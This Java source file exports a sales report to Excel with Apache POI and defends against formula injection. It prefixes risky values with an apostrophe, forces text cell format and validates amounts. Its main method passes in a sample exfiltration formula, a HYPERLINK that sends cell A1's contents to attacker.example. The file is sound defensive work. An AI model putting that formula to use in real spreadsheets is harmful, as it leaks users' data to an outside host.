/*
Write secure code to export a sales report to Excel that safely formats data to prevent spreadsheet formulas from executing.
*/

import org.apache.poi.ss.usermodel.*;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;

import java.io.FileOutputStream;
import java.util.List;
import java.util.Set;

public class SalesReportExporter {

    private static final int MAX_FIELD_LENGTH = 500;

    // Characters that spreadsheet engines treat as formula/DDE triggers
    // when they appear as the first character of a cell value.
    private static final Set<Character> FORMULA_TRIGGER_CHARS =
            Set.of('=', '+', '-', '@', '\t', '\r');

    public static class SaleRecord {
        String customerName;
        String productNote;
        double amount;

        public SaleRecord(String customerName, String productNote, double amount) {
            this.customerName = customerName;
            this.productNote = productNote;
            this.amount = amount;
        }
    }

    /**
     * SECURE: sanitizes user-supplied text fields to neutralize formula
     * injection, forces those cells to a text format, and validates
     * numeric fields before writing.
     */
    public static void exportToExcel(List<SaleRecord> records, String outputPath) throws Exception {
        try (Workbook workbook = new XSSFWorkbook()) {
            Sheet sheet = workbook.createSheet("Sales Report");

            // Cell style that forces text interpretation, so even a
            // neutralized value is never re-evaluated as a formula.
            CellStyle textStyle = workbook.createCellStyle();
            DataFormat format = workbook.createDataFormat();
            textStyle.setDataFormat(format.getFormat("@"));

            Row header = sheet.createRow(0);
            header.createCell(0).setCellValue("Customer");
            header.createCell(1).setCellValue("Note");
            header.createCell(2).setCellValue("Amount");

            int rowNum = 1;
            for (SaleRecord record : records) {
                Row row = sheet.createRow(rowNum++);

                Cell nameCell = row.createCell(0);
                nameCell.setCellStyle(textStyle);
                nameCell.setCellValue(sanitizeText(record.customerName));

                Cell noteCell = row.createCell(1);
                noteCell.setCellStyle(textStyle);
                noteCell.setCellValue(sanitizeText(record.productNote));

                // Numeric fields are validated and written as real numbers,
                // never passed through the text sanitizer.
                row.createCell(2).setCellValue(validateAmount(record.amount));
            }

            try (FileOutputStream fos = new FileOutputStream(outputPath)) {
                workbook.write(fos);
            }
        }
    }

    /**
     * Neutralizes formula/DDE injection by prefixing a value with a
     * single quote if it starts with a formula-trigger character.
     * Excel treats a leading apostrophe as "force text" and does not
     * display it, but it prevents formula evaluation. We also enforce
     * a max length and strip control characters.
     */
    private static String sanitizeText(String input) {
        if (input == null) {
            return "";
        }

        String trimmed = input.trim();
        if (trimmed.length() > MAX_FIELD_LENGTH) {
            trimmed = trimmed.substring(0, MAX_FIELD_LENGTH);
        }

        // Strip control characters except normal whitespace
        trimmed = trimmed.replaceAll("[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F]", "");

        if (!trimmed.isEmpty() && FORMULA_TRIGGER_CHARS.contains(trimmed.charAt(0))) {
            trimmed = "'" + trimmed;
        }

        return trimmed;
    }

    private static double validateAmount(double amount) {
        if (amount < 0 || amount > 1_000_000) {
            throw new IllegalArgumentException("Sale amount out of allowed range: " + amount);
        }
        return amount;
    }

    public static void main(String[] args) throws Exception {
        SaleRecord attempted = new SaleRecord(
            "John Smith",
            "=HYPERLINK(\"https://attacker.example/steal?x=\"&A1,\"Click for details\")",
            250.00
        );

        // The note is written as inert literal text, not a live formula.
        exportToExcel(List.of(attempted), "sales_report.xlsx");
    }
}